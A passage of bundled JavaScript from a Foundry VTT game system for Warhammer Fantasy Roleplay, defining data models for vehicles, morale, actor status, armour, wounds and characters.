            mounted : new fields$y.BooleanField({initial : false}),
            isToken : new fields$y.BooleanField({initial : false}),
            tokenData : new fields$y.SchemaField({
                scene : new fields$y.StringField({initial : ""}),
                token : new fields$y.StringField({initial : ""})
            }),
        }
    }
}

let fields$x = foundry.data.fields;

class CumulativeVehicleModifiers extends foundry.abstract.DataModel {

    static key = "";
    static initialSources = "";
    static chatRollLabel = "";
    static chatNoModifierLabel = "";
    static starting = 0;


    static defineSchema() {
        let schema = {};
        schema.starting = new fields$x.NumberField({initial: this.starting});
        schema.modifiers = new fields$x.ArrayField(new fields$x.SchemaField({
            value : new fields$x.NumberField(),
            formula : new fields$x.StringField(),
            description : new fields$x.StringField()
        }));
        schema.sources = new fields$x.ArrayField(new fields$x.SchemaField({
            formula : new fields$x.StringField(),
            description : new fields$x.StringField(),
            active : new fields$x.BooleanField()
        }), {initial: game.wfrp4e.config[this.initialSources] || []});
        schema.log = new fields$x.ArrayField(new fields$x.SchemaField({
            label : new fields$x.StringField(),
            range : new fields$x.ArrayField(new fields$x.NumberField())
        }));
        return schema;
    }

    compute()
    {
        this.value = this.starting;
        for(let entry of this.log)
        {
            entry.modifiers = this.modifiers.slice(entry.range[0], entry.range[1]+1);
            entry.value = entry.modifiers.reduce((total, modifier) => total += Number(modifier?.value || 0), 0) || 0;
            this.value += entry.value;
            entry.sum = this.value;
        }
    }

    async roll(label, suppressMsg = false)
    {
        if (!label)
        {
            return;
        }

        let msg = `<h2>${game.i18n.localize(this.constructor.chatRollLabel)}</h2><h4>${label}</h4>`;
        let sources = foundry.utils.deepClone(this.sources.filter(i => i.active));
        if (!sources.length)
        {
            msg += `<p>${game.i18n.localize(this.constructor.chatNoModifierLabel)}</p>`;
        }
        else 
        {
            for(let source of sources)
            {
                let roll = await new Roll(source.formula).roll();
                source.value = roll.total;
                msg += `<p><a class="inline-roll" data-tooltip="${source.formula}">${source.value}</a>: ${source.description}</p>`;
            }
        }
        if (!suppressMsg)
        {
            ChatMessage.create({content : msg}, {speaker : {alias : this.parent.parent.name}, whisper : ChatMessage.getWhisperRecipients("GM")});
        }
        let log = this.updateLog(label, sources);
        this.parent.parent.parent.update({["system.status." + this.constructor.key] :  {modifiers : this.modifiers.concat(sources), log}});
    }

    // Helper for adding a single morale value with a label
    addEntry(label, modifier)
    {
        let modifierEntry = [{value : modifier}];
        return this.parent.parent.parent.update({["system.status." + this.constructor.key] :  {modifiers : this.modifiers.concat(modifierEntry), log : this.updateLog(label, modifierEntry)}});
    }

    setValue(label, value)
    {
        let diffValue = value - this.value;
        return this.addEntry(label, diffValue)
    }

    updateLog(label, newModifiers)
    {
        let range = [this.modifiers.length, this.modifiers.length + newModifiers.length - 1];
        return this.log.concat([{label, range}])
    }

    deleteLog(index)
    {
        let newLog = foundry.utils.deepClone(this.log);
        newLog.splice(index, 1);
        return newLog
    }

    clear()
    {
        this.parent.parent.parent.update({["system.status." + this.constructor.key] :  {modifiers : [], log : []}});
    }
}

class ManannMoodModel extends CumulativeVehicleModifiers {

    static key = "mood";
    static initialSources = "initialMoodSources";
    static chatRollLabel = "VEHICLE.ManannsMoodRolls";
    static chatNoModifierLabel = "VEHICLE.NoManannsMoodModifiers";


    async rollEvents(key)
    {
        let modifier = this.value;
        if (key == "port-stay-events")
        {
            modifier = this.value > 0 ? 1 : -1;
        }

        let result = await game.wfrp4e.tables.formatChatRoll(key, {modifier, showRoll : true});

        if (result)
        {
            ChatMessage.create({content : result, speaker : {alias : this.parent.parent.parent.name}, flavor : game.i18n.localize("VEHICLE.ManannsMood") + " - " + game.wfrp4e.tables.findTable(key).name});
        }

    }
}

let fields$w = foundry.data.fields;

class MoraleModel extends CumulativeVehicleModifiers {

    static key = "morale";
    static initialSources = "initialMoraleSources";
    static chatRollLabel = "VEHICLE.MoraleRolls";
    static chatNoModifierLabel = "VEHICLE.NoMoraleModifiers";
    static starting = 75;

    static defineSchema() {
        let schema = super.defineSchema();
        schema.transferEffects = new fields$w.BooleanField({initial : true});
        return schema;
    }


    getMoraleEffects(actor)
    {
        if (this.transferEffects)
        {
            if (this.value >= 101)
            {
                return [game.wfrp4e.config.vehicleSystemEffects["master-captain"]].filter(i => i).map(i => new EffectWfrp4e(i, {parent: actor}))
            }
            else if (this.value >= 76)
            {
                return [game.wfrp4e.config.vehicleSystemEffects["fine-crew"]].filter(i => i).map(i => new EffectWfrp4e(i, {parent: actor}))
            }
            else if (this.value <= 50)
            {
                return [game.wfrp4e.config.vehicleSystemEffects["knaves"]].filter(i => i).map(i => new EffectWfrp4e(i, {parent: actor}))
            }
        }
                    
        return []
    }
}

let fields$v = foundry.data.fields;

class StandardStatusModel extends foundry.abstract.DataModel {
    static defineSchema() {
        let schema = {};
        schema.advantage = new fields$v.SchemaField({
            value: new fields$v.NumberField({ initial: 0 }),
            max: new fields$v.NumberField({})
        });

        schema.wounds = new fields$v.SchemaField({
            value: new fields$v.NumberField({ initial: 8, min : 0}),
            max: new fields$v.NumberField({initial: 8, min : 0}),
        });
        schema.criticalWounds = new fields$v.SchemaField({
            value: new fields$v.NumberField({ initial: 0, min : 0 }),
            max: new fields$v.NumberField(),
        });
        schema.sin = new fields$v.SchemaField({
            value: new fields$v.NumberField({ initial: 0, min : 0 })
        });

        schema.corruption = new fields$v.SchemaField({
            value: new fields$v.NumberField({ initial: 0, min : 0 })
        });

        schema.encumbrance = new fields$v.SchemaField({
            current: new fields$v.NumberField({ initial: 0, min : 0 }),
            max: new fields$v.NumberField({ initial: 0 }),
        });

        schema.ward = new fields$v.SchemaField({
            value : new fields$v.NumberField({ initial: 0 }),
            // sources : new fields.ArrayField(new fields.StringField())
        });
        schema.mount = new fields$v.EmbeddedDataField(MountModel);
        return schema;
    }

    initializeArmour()
    {
        this.armour = {
            head: {
                value: 0,
                layers: [],
                label: game.i18n.localize("Head"),
                show: true,
            },
            body: {
                value: 0,
                layers: [],
                label: game.i18n.localize("Body"),
                show: true
            },
            rArm: {
                value: 0,
                layers: [],
                label: game.i18n.localize("Right Arm"),
                show: true
            },
            lArm: {
                value: 0,
                layers: [],
                label: game.i18n.localize("Left Arm"),
                show: true
            },
            rLeg: {
                value: 0,
                layers: [],
                label: game.i18n.localize("Right Leg"),
                show: true

            },
            lLeg: {
                value: 0,
                layers: [],
                label: game.i18n.localize("Left Leg"),
                show: true
            },
            shield: 0,
            shieldDamage: 0
        };
    }

    // Add armour values from armour items specifically
    addArmourItem(item) {
        // If the armor protects a certain location, add the AP value of the armor to the AP object's location value
        // Then pass it to addLayer to parse out important information about the armor layer, namely qualities/flaws
        for (let loc in item.system.currentAP) {
          if (item.system.currentAP[loc] > 0) {
    
            this.armour[loc].value += item.system.currentAP[loc];
    
            let layer = {
              value: item.system.currentAP[loc],
              armourType: item.system.armorType.value, // used for sound
              source : item
            };
    
            let properties = item.system.properties;
            layer.impenetrable = !!properties.qualities.impenetrable;
            layer.partial = !!properties.flaws.partial;
            layer.weakpoints = !!properties.flaws.weakpoints;
            layer.magical = item.system.isMagical;
    
            layer.metal = item.system.isMetal;
    
            this.armour[loc].layers.push(layer);
          }
        }
    }

    // Add armour values from shield items specifically
    addShieldItem(item)
    {
        this.armour.shield += item.properties.qualities.shield.value - Math.max(0, item.damageToItem.shield - Number(item.properties.qualities.durable?.value || 0));
        this.armour.shieldDamage += item.damageToItem.shield;
    }

    // General function (usually used by scripts) to add armour values
    addArmour(value, {locations=[], source=null, metal=false, magical=false, impenetrable=false, partial=false, weakpoints=false, damage={}}={})
    {
        if (!locations || locations.length == 0)
        {
            // If no locations provided, assume all
            locations = ["lArm", "rArm", "lLeg", "rLeg", "body", "head"];
        }

        if (typeof locations == "string")
        {
            locations = [locations];
        }

        for(let loc of locations)
        {
            // Subtract damage from protection value, can't be below 0
            let armour = Math.max(0, value - (damage[loc] || 0));
            this.armour[loc].value += armour;
            
            this.armour[loc].layers.push({
                source,
                impenetrable,
                partial,
                weakpoints,
                magical,
                metal,
                value : armour
            });
        }
    }
}


class CharacterStatusModel extends StandardStatusModel {
    static defineSchema() {
        let schema = super.defineSchema();
        schema.fortune = new fields$v.SchemaField({
            value: new fields$v.NumberField({ initial: 0 }),
        });
        schema.fate = new fields$v.SchemaField({
            value: new fields$v.NumberField({ initial: 0 }),
        });
        schema.resilience = new fields$v.SchemaField({
            value: new fields$v.NumberField({ initial: 0 }),
        });
        schema.resolve = new fields$v.SchemaField({
            value: new fields$v.NumberField({ initial: 0 }),
        });
        return schema;
    }
}

let fields$u = foundry.data.fields;

class StandardDetailsModel extends foundry.abstract.DataModel {
    static defineSchema() {
        let schema = {};
        schema.species = new fields$u.SchemaField({
            value: new fields$u.StringField(),
            subspecies: new fields$u.StringField(),
        });
        schema.gender = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        schema.biography = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        schema.gmnotes = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        schema.size = new fields$u.SchemaField({
            value: new fields$u.StringField({ initial: "avg" })
        });
        schema.move = new fields$u.SchemaField({
            value: new fields$u.NumberField({ initial: 4 }),
        });
        schema.god = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        schema.status = new fields$u.SchemaField({
            value: new fields$u.StringField(),
            standing: new fields$u.StringField(),
            tier: new fields$u.NumberField({ initial: 0 }),
            modifier: new fields$u.NumberField({ initial: 0 }),
        });
        schema.hitLocationTable = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        schema.mainHand = new fields$u.StringField({initial : "r"});
        return schema;
    }
}


class CharacterDetailsModel extends StandardDetailsModel {
    static defineSchema() {
        let schema = super.defineSchema();
        schema.experience = new fields$u.SchemaField({
            total: new fields$u.NumberField({ initial: 0 }),
            spent: new fields$u.NumberField({ initial: 0 }),
            log: new fields$u.ArrayField(new fields$u.ObjectField())
        });

        schema["personal-ambitions"] = new fields$u.SchemaField({
            "short-term": new fields$u.StringField(),
            "long-term": new fields$u.StringField()
        });
        schema["party-ambitions"] = new fields$u.SchemaField({
            "name": new fields$u.StringField(),
            "short-term": new fields$u.StringField(),
            "long-term": new fields$u.StringField()
        });
        schema.motivation = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        schema.class = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        schema.career = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        schema.careerlevel = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        schema.age = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        schema.height = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        schema.weight = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        schema.haircolour = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        schema.eyecolour = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        schema.distinguishingmark = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        schema.starsign = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        return schema;
    }
}

// DOES NOT INHERIT STANDARD
class VehicleDetailsModel extends foundry.abstract.DataModel {
    static defineSchema() {
        let schema = {};
        schema.move = new fields$u.SchemaField({
            value: new fields$u.NumberField(),
            sail : new fields$u.SchemaField({
                enabled : new fields$u.BooleanField(),
                value : new fields$u.NumberField(),
                crew : new fields$u.NumberField(),
            }),
            oars : new fields$u.SchemaField({
                enabled : new fields$u.BooleanField(),
                value : new fields$u.NumberField(),
                crew : new fields$u.NumberField(),
            }),
            custom : new fields$u.SchemaField({
                label : new fields$u.StringField(),
                value : new fields$u.NumberField(),
                crew : new fields$u.NumberField()
            }),
            primary : new fields$u.StringField({initial : "sail", choices: ["sail", "oars"]})
        });
        schema.man = new fields$u.NumberField({initial : 0});
        schema.crew = new fields$u.SchemaField({
            starting : new fields$u.NumberField({initial : 0}),
            current : new fields$u.NumberField({initial : 0})
        });
        schema.size = new fields$u.SchemaField({
            value: new fields$u.StringField({ initial: "avg" })
        });
        schema.length = new fields$u.SchemaField({
            value: new fields$u.NumberField({min: 1, initial : 25})
        });
        schema.description = new fields$u.SchemaField({
            value: new fields$u.StringField({ initial: "" })
        });
        schema.gmdescription = new fields$u.SchemaField({
            value: new fields$u.StringField({ initial: "" }),
        });
        schema.price = new fields$u.SchemaField({
            gc: new fields$u.NumberField({initial : 0})
        });
        schema.availability = new fields$u.SchemaField({
            value: new fields$u.StringField(),
        });
        schema.motivePower = new fields$u.SchemaField({
            value: new fields$u.StringField(),
        });
        schema.hitLocationTable = new fields$u.SchemaField({
            value: new fields$u.StringField()
        });
        return schema;
    }

    computeSize()
    {
        let sizeNum = this.length.value;
        if (sizeNum <= 10)
        {
            return "tiny"
        }
        if (sizeNum <= 15)
        {
            return "ltl"
        }
        if (sizeNum <= 20)
        {
            return "sml"
        }
        if (sizeNum <= 35)
        {
            return "avg"
        }
        if (sizeNum <= 50)
        {
            return "lrg"
        }
        if (sizeNum <= 80)
        {
            return "enor"
        }
        return "mnst";
    }

    computeCrewEncumbrance(passengers)
    {
        let crewEncumbrance = 0;
        for (let p of passengers)
        {
            for(let count = 0; count < p.count; count++)
            {
                let bulk = game.wfrp4e.config.crewBulk[p.actor?.details.size.value];
                if (bulk)
                {
                    if (this.crew.current + bulk.crew > this.crew.starting)
                    {
                        crewEncumbrance += bulk.encumbrance;
                    }
                    this.crew.current += bulk.crew;
                }
            }
        }
        return crewEncumbrance
    }

    computeMove()
    {
        if (this.move.custom.label && this.move.custom.value)
        {
            this.move.value = this.move.custom.value;
        }
        else 
        {
            this.move.value = this.move[this.move.primary].value || 0;
        }
        this.move.display = this.formatMoveString();
    }

    formatMoveString()
    {
        let string = "";

        if (this.move.custom.label)
        {
            string = `${this.move.custom.label}`;
            if (this.move.custom.value)
            {
                string += ` (${this.move.custom.value})`;
            }
        }

        if (this.move.sail.enabled)
        {
            if (this.move.primary == "sail")
            {
                string += "<strong>" + game.i18n.localize("VEHICLE.S") + "</strong>"; 
            }
            else 
            {
                string += game.i18n.localize("VEHICLE.S"); 
            }
            if (this.move.sail.value)
            {
                string += ` (${this.move.sail.value})`;
            }
        }

        if (this.move.oars.enabled)
        {
            if (string)
            {
                string += " / ";
            }

            if (this.move.primary == "oars")
            {
                string += "<strong>" + game.i18n.localize("VEHICLE.O") + "</strong>"; 
            }
            else 
            {
                string += game.i18n.localize("VEHICLE.O"); 
            }

            if (this.move.oars.value)
            {
                string += ` (${this.move.oars.value})`;
            }
        }

        return string;
    }
}

foundry.data.fields;
/**
 * Abstract class that interfaces with the Actor class
 */
class BaseActorModel extends foundry.abstract.DataModel {

    static preventItemTypes = [];

    static defineSchema() {
        let schema = {};
        return schema;
    }

    preCreateData(data, options) {
        let preCreateData = {};

        let defaultToken = game.settings.get("core", "defaultToken");

        // Set wounds, advantage, and display name visibility
        if (!data.prototypeToken)
            foundry.utils.mergeObject(preCreateData,
                {
                    "prototypeToken.bar1": { "attribute": "status.wounds" },                 // Default Bar 1 to Wounds
                    "prototypeToken.bar2": { "attribute": "status.advantage" },               // Default Bar 2 to Advantage
                    "prototypeToken.displayName": defaultToken?.displayName || CONST.TOKEN_DISPLAY_MODES.OWNER_HOVER,    // Default display name to be on owner hover
                    "prototypeToken.displayBars": defaultToken?.displayBars || CONST.TOKEN_DISPLAY_MODES.OWNER_HOVER,    // Default display bars to be on owner hover
                    "prototypeToken.disposition": defaultToken?.disposition || CONST.TOKEN_DISPOSITIONS.NEUTRAL,         // Default disposition to neutral
                    "prototypeToken.name": data.name,                                       // Set token name to actor name,
                    "prototypeToken.texture.src": "systems/wfrp4e/tokens/unknown.png"      // Set token image
                });


        // Set custom default token
        if (!data.img || data.img == "icons/svg/mystery-man.svg") {
            preCreateData.img = "systems/wfrp4e/tokens/unknown.png";
        }

        return preCreateData;
    }

    allowCreation() {
        return true;
    }

    initialize() {

    }

    async preUpdateChecks(data) {
        return data;
    }

    updateChecks() {
        this.checkSize();
        return {};
    }

    
     // *** Deletions ***
     async preDeleteChecks()
     {

     }

     async deleteChecks()
     {

     }

    createChecks() { }

    itemIsAllowed(item) {
        if (this.constructor.preventItemTypes.includes(item.type)) {
            ui.notifications.error(game.i18n.localize("Error.ItemsNotAllowed"), { type: item.type });
            return false;
        }
        else {
            return true;
        }
    }

    computeBase() {
        this.initialize();
    }

    computeDerived(items, flags) {
        // Abstract
    }

    computeItems()
    {
        
    }

    tokenSize() {
        return {}
    }

    // Resize tokens based on size property
    checkSize() {
        let actor = this.parent;
        if (game.user.id != WFRP_Utility.getActiveDocumentOwner(actor)?.id) {
            return
        }
        if (actor.flags.autoCalcSize && game.canvas.ready) {
            let tokenData = this.tokenSize();
            if (actor.isToken) {
                return actor.token.update(tokenData)
            }
            else if (canvas) {
                return actor.update({ prototypeToken: tokenData }).then(() => {
                    actor.getActiveTokens().forEach(t => t.document.update(tokenData));
                })
            }
        }
    }
}

let fields$t = foundry.data.fields;

/**
 * Represents actors that have characteristics and skills
 * Encompasses player characters and NPCs
 */
class StandardActorModel extends BaseActorModel {
    static preventItemTypes = ["vehicleMod", "vehicleRole", "vehicleTest"];

    static defineSchema() {
        let schema = super.defineSchema();
        schema.characteristics = new fields$t.EmbeddedDataField(CharacteristicsModel);
        schema.status = new fields$t.EmbeddedDataField(StandardStatusModel);
        schema.details = new fields$t.EmbeddedDataField(StandardDetailsModel);
        return schema;
    }


    preCreateData(data, options) {
        let preCreateData = super.preCreateData(data, options);
        // Default auto calculation to true
        foundry.utils.mergeObject(preCreateData, {
            "flags.autoCalcRun": data.flags?.autoCalcRun || true,
            "flags.autoCalcWalk": data.flags?.autoCalcWalk || true,
            "flags.autoCalcWounds": data.flags?.autoCalcWounds || true,
            "flags.autoCalcCritW": data.flags?.autoCalcCritW || true,
            "flags.autoCalcCorruption": data.flags?.autoCalcCorruption || true,
            "flags.autoCalcEnc": data.flags?.autoCalcEnc || true,
            "flags.autoCalcSize": data.flags?.autoCalcSize || true,
        });
        foundry.utils.mergeObject(preCreateData, this.checkWounds(true));
        return preCreateData;
    }

    async preUpdateChecks(data, options) {
        await super.preUpdateChecks(data, options);

        // Treat the custom default token as a true default token
        // If you change the actor image from the default token, it will automatically set the same image to be the token image
        if (this.prototypeToken?.texture?.src == "systems/wfrp4e/tokens/unknown.png" && updateData.img) {
            updateData["prototypeToken.texture.src"] = updateData.img;
        }

        await this._handleGroupAdvantage(data, options);
        this._handleWoundsUpdate(data, options);
        this._handleAdvantageUpdate(data, options);

    }

    updateChecks(data, options, user) {        
        let update = super.updateChecks(data, options, user);
        // return foundry.utils.mergeObject(update, this.checkWounds());
        return update;
    }

    itemIsAllowed(item) {
        let allowed = super.itemIsAllowed(item);

        // Prevent vehicle traits
        if (allowed && item.type == "trait")
        {
            allowed = allowed && item.system.category == "standard";
            if (!allowed)
            {
                ui.notifications.error("ERROR.VehicleTraitsOnStandard");
            }
        }
        return allowed
    }

    
    computeItems()
    {
        for (let i of this.parent.items) {
            i.prepareOwnedData();
            
            if (i.location && i.location.value && i.type != "critical" && i.type != "injury") 
            ;
            else if (i.encumbrance && i.type != "vehicleMod")
            {
                this.status.encumbrance.current += Number(i.encumbrance.total);
            }
        }
        this.status.encumbrance.current = this.status.encumbrance.current.toFixed(2);
    }

    computeBase() {
        super.computeBase();
        this.characteristics.compute();

        let flags = this.parent.flags;
        // TODO: Find alternative to this
        flags.meleeDamageIncrease = 0;
        flags.rangedDamageIncrease = 0;
        flags.robust = 0;
        flags.resolute = 0;
        flags.ambi = 0;
        flags.useless = {};

        this.parent.runScripts("prePrepareData", { actor: this.parent });
    }

    computeDerived(items, flags) {
        this.parent.runScripts("prePrepareItems", {actor : this.parent });
        // Recompute bonuses as active effects may have changed it
        this.characteristics.compute();
        this.computeItems();
        super.computeDerived(items, flags);
        this.runScripts("computeCharacteristics", this.parent);
        this.computeSize();
        if (this.checkWounds())
        {
            return;
        }
        this.computeAdvantage();
        this.computeMove();
        this.computeEncumbranceMax();
        this.runScripts("computeEncumbrance", this.parent);
        this.computeEncumbranceState();
        this.computeArmour();
        this.computeMount();

        this.parent.runScripts("prepareData", { actor: this.parent });
    }

    computeAdvantage() {
        if (!game.settings.get("wfrp4e", "useGroupAdvantage")) {
            if (game.settings.get("wfrp4e", "capAdvantageIB")) {
                this.status.advantage.max = this.characteristics.i.bonus;
                this.status.advantage.value = Math.clamped(this.status.advantage.value, 0, this.status.advantage.max);
            }
            else
                this.status.advantage.max = game.settings.get("wfrp4e", "advantagemax");
        }
    }


    computeMove() {
        let flags = this.parent.flags;
        // Auto calculation values - only calculate if user has not opted to enter ther own values
        if (flags.autoCalcWalk)
            this.details.move.walk = Number(this.details.move.value) * 2;

        if (flags.autoCalcRun)
            this.details.move.run = Number(this.details.move.value) * 4;

    }
    computeSize() {
        let items = this.parent.itemTypes;
        // Find size based on Traits/Talents
        let size;
        let trait = items.trait.find(i => i.name == game.i18n.localize("NAME.Size") && i.system.enabled);
        if (trait)
            size = WFRP_Utility.findKey(trait.specification.value, game.wfrp4e.config.actorSizes);
        if (!size) // Could not find specialization
        {
            let smallTalent = items.talent.find(i => i.name == game.i18n.localize("NAME.Small"));
            if (smallTalent)
                size = "sml";
            else
                size = "avg";
        }

        let args = { size };
        this.parent.runScripts("calculateSize", args);

        // If the size has been changed since the last known value, update the value 
        this.details.size.value = args.size || "avg";
    }

    computeEncumbranceMax() {
        let flags = this.parent.flags;
        if (flags.autoCalcEnc) {
            this.status.encumbrance.max = this.characteristics.t.bonus + this.characteristics.s.bonus;

            // I don't really like hardcoding this TODO: put this in Large effect script?
            if (this.details.species.value?.toLowerCase() == game.i18n.localize("NAME.Ogre").toLowerCase()) {
                this.status.encumbrance.max *= 2;
            }
        }
    }

    computeEncumbranceState() {
        this.status.encumbrance.current = this.status.encumbrance.current;
        this.status.encumbrance.state = this.status.encumbrance.current / this.status.encumbrance.max;
    }


    computeArmour() {

        this.status.initializeArmour();
        
        let args = { AP : this.status.armour };

        this.parent.runScripts("preAPCalc", args);

        this.parent.getItemTypes("armour").filter(a => a.isEquipped).forEach(a => this.status.addArmourItem(a));
        this.parent.getItemTypes("weapon").filter(i => i.properties.qualities.shield && i.isEquipped).forEach(i => this.status.addShieldItem(i));
        
        this.parent.runScripts("APCalc", args);
    }

    /**
  * Calculates the wounds of an actor based on prepared items
  * 
  * Once all the item preparation is done (prepareItems()), we have a list of traits/talents to use that will
  * factor into Wonuds calculation. Namely: Hardy and Size traits. If we find these, they must be considered
  * in Wound calculation. 
  * 
  * @returns {Number} Max wound value calculated
  */
    computeWounds() {
        let flags = this.parent.flags;

        // Easy to reference bonuses
        let sb = this.characteristics.s.bonus + (this.characteristics.s.calculationBonusModifier || 0);
        let tb = this.characteristics.t.bonus + (this.characteristics.t.calculationBonusModifier || 0);
        let wpb = this.characteristics.wp.bonus + (this.characteristics.wp.calculationBonusModifier || 0);
        let multiplier = {
            sb: 0,
            tb: 0,
            wpb: 0,
        };

        if (flags.autoCalcCritW)
            this.status.criticalWounds.max = tb;

        let effectArgs = { sb, tb, wpb, multiplier, actor: this.parent };
        this.parent.runScripts("preWoundCalc", effectArgs);
        ({ sb, tb, wpb } = effectArgs);

        let wounds = this.status.wounds.max;

        if (flags.autoCalcWounds) {
            switch (this.details.size.value) // Use the size to get the correct formula (size determined in prepare())
            {
                case "tiny":
                    wounds = 1 + tb * multiplier.tb + sb * multiplier.sb + wpb * multiplier.wpb;
                    break;

                case "ltl":
                    wounds = tb + tb * multiplier.tb + sb * multiplier.sb + wpb * multiplier.wpb;
                    break;

                case "sml":
                    wounds = 2 * tb + wpb + tb * multiplier.tb + sb * multiplier.sb + wpb * multiplier.wpb;
                    break;

                case "avg":
                    wounds = sb + 2 * tb + wpb + tb * multiplier.tb + sb * multiplier.sb + wpb * multiplier.wpb;
                    break;

                case "lrg":
                    wounds = 2 * (sb + 2 * tb + wpb + tb * multiplier.tb + sb * multiplier.sb + wpb * multiplier.wpb);
                    break;

                case "enor":
                    wounds = 4 * (sb + 2 * tb + wpb + tb * multiplier.tb + sb * multiplier.sb + wpb * multiplier.wpb);
                    break;

                case "mnst":
                    wounds = 8 * (sb + 2 * tb + wpb + tb * multiplier.tb + sb * multiplier.sb + wpb * multiplier.wpb);
                    break;
            }
        }

        effectArgs = { wounds, actor: this.parent };
        this.parent.runScripts("woundCalc", effectArgs);
        wounds = effectArgs.wounds;
        return wounds
    }

    checkWounds(force=false) {
        if (this.parent.flags.autoCalcWounds || force) {
            let wounds = this.computeWounds();

            if (this.status.wounds.max != wounds) // If change detected, reassign max and current wounds
            {
                if (this.parent.compendium || !game.actors || !this.parent.inCollection) // Initial setup, don't send update
                {
                  this.status.wounds.max = wounds;
                  this.status.wounds.value = wounds;
                }
                else
                {
                    if (game.user.id == WFRP_Utility.getActiveDocumentOwner(this.parent)?.id) {
                        this.parent.update({ "system.status.wounds.max": wounds, "system.status.wounds.value": wounds });
                    }
                }
            }
        }
    }


    async _handleGroupAdvantage(data, options) {
        if (!options.skipGroupAdvantage && foundry.utils.hasProperty(data, "system.status.advantage.value") && game.settings.get("wfrp4e", "useGroupAdvantage")) {
            let combatant = game.combat?.getCombatantByActor(this.parent);

            if (!combatant) {
                ui.notifications.notify(game.i18n.localize("GroupAdvantageNoCombatant"));
            }
            // Don't send groupAdvantage updates if this update is from group advantage
            else if (!options.fromGroupAdvantage) {
                await WFRP_Utility.updateGroupAdvantage({ [`${this.parent.advantageGroup}`]: data.system.status.advantage.value });
                delete data.system.status.advantage.value; // Don't use this advantage update, as updating group advantage does it for us. This prevents a duplicate scrolling number on the token
            }
        }
    }

    _handleWoundsUpdate(data, options) {
        // Prevent wounds from exceeding max
        if (foundry.utils.hasProperty(data, "system.status.wounds.value")) {
            if (data.system.status.wounds.value > (getProperty(data, "system.status.wounds.max") || this.status.wounds.max)) {
                data.system.status.wounds.value = this.status.wounds.max;
            }

            options.deltaWounds = data.system.status.wounds.value - this.status.wounds.value;
        }
    }

    _handleAdvantageUpdate(data, options) {
        if (foundry.utils.hasProperty(data, "system.status.advantage.value")) 
        {
            if (!game.settings.get("wfrp4e", "useGroupAdvantage")) {
                let maxAdvantage;
                if (game.settings.get("wfrp4e", "capAdvantageIB"))
                    maxAdvantage = this.characteristics.i.bonus;
                else
                    maxAdvantage = game.settings.get("wfrp4e", "advantagemax");

                if (data.system.status.advantage.value > maxAdvantage) {
                    data.system.status.advantage.value = this.status.advantage.max;
                }
            }

            options.deltaAdv = data.system.status.advantage.value - this.status.advantage.value;
        }
    }

    tokenSize() {
        let tokenData = {};
        let tokenSize = game.wfrp4e.config.tokenSizes[this.details.size.value];
        if (tokenSize < 1) {
            tokenData.texture = { scaleX: tokenSize, scaleY: tokenSize };
            tokenData.width = 1;
            tokenData.height = 1;
        }
        else {
            tokenData.height = tokenSize;
            tokenData.width = tokenSize;
        }
        return tokenData;
    }

    computeMount() {
        let flags = this.parent.flags;

        if (this.isMounted && !game.actors) {
            game.wfrp4e.postReadyPrepare.push(this);
        }
        else if (this.isMounted && this.status.mount.isToken && !canvas) {
            game.wfrp4e.postReadyPrepare.push(this);
        }
        else if (this.isMounted) {
            let mount = this.mount;

            if (mount) {
                if (mount.status.wounds.value == 0)
                    this.status.mount.mounted = false;
                else {

                    this.details.move.value = mount.details.move.value;

                    if (flags.autoCalcWalk)
                        this.details.move.walk = mount.details.move.walk;

                    if (flags.autoCalcRun)
                        this.details.move.run = mount.details.move.run;
                }
            }
        }
    }

    get vehicle()
    {
        return game.actors.contents.find(i => i.type == "vehicle" && i.system.passengers.has(this.parent));
    }

    hasVehicleRole(role)
    {
        if (!this.vehicle)
        {
            return false;
        }
        else 
        {
            let passenger = this.vehicle.system.passengers.get(this.parent.id);
            return passenger.roles.some(r => r.name == role);
        }
    }

    get isMounted() {
        return this.status.mount.mounted && this.status.mount.id
    }

    get mount() {
        if (this.status.mount.isToken) {
            let scene = game.scenes.get(this.status.mount.tokenData.scene);
            if (canvas.scene.id != scene?.id)
                return ui.notifications.error(game.i18n.localize("ErrorTokenMount"))

            let token = canvas.tokens.get(this.status.mount.tokenData.token);

            if (token)
                return token.actor
        }
        let mount = game.actors.get(this.status.mount.id);
        return mount
    }
}

let fields$s = foundry.data.fields;

class CharacterModel extends StandardActorModel {
    static preventItemTypes = [];

    static defineSchema() {
        let schema = super.defineSchema();

        schema.characteristics = new fields$s.EmbeddedDataField(CharacteristicsModel);
        schema.status = new fields$s.EmbeddedDataField(CharacterStatusModel);
        schema.details = new fields$s.EmbeddedDataField(CharacterDetailsModel);

        return schema;
    }

    preCreateData(data, options) {
        let preCreateData = super.preCreateData(data, options);
        foundry.utils.mergeObject(preCreateData, {
            "prototypeToken.sight": { enabled: true },
            "prototypeToken.actorLink": true,
            "prototypeToken.disposition": CONST.TOKEN_DISPOSITIONS.FRIENDLY
        });
        return preCreateData;
    }


    async preUpdateChecks(data, options) {
        await super.preUpdateChecks(data, options);

        this._handleExperienceChange(data, options);
    }

    updateChecks(data, options, user) {
        let update = super.updateChecks(data, options, user);
        if(!options.skipCorruption && foundry.utils.getProperty(data, "system.status.corruption.value") && game.user.id == user)
        {
          this.checkCorruption();
        }
        // If XP received from message award, add
        if (options.fromMessage && game.user.isUniqueGM)
        {
          this._registerChatAward(options.fromMessage);
        }
        return update;
        // this._checkEncumbranceEffects(this.parent);
    }

    computeBase() {
        this.status.corruption.max = 0;
        super.computeBase();
    }

    computeDerived(items, flags) {
        super.computeDerived(items, flags);

        this.computeCorruption(items, flags);
        this.computeCareer(items, flags);

        this.details.experience.current = this.details.experience.total - this.details.experience.spent;
    }

    computeCorruption()
    {
        let flags = this.parent.flags;
        let tb = this.characteristics.t.bonus;
        let wpb = this.characteristics.wp.bonus;
    
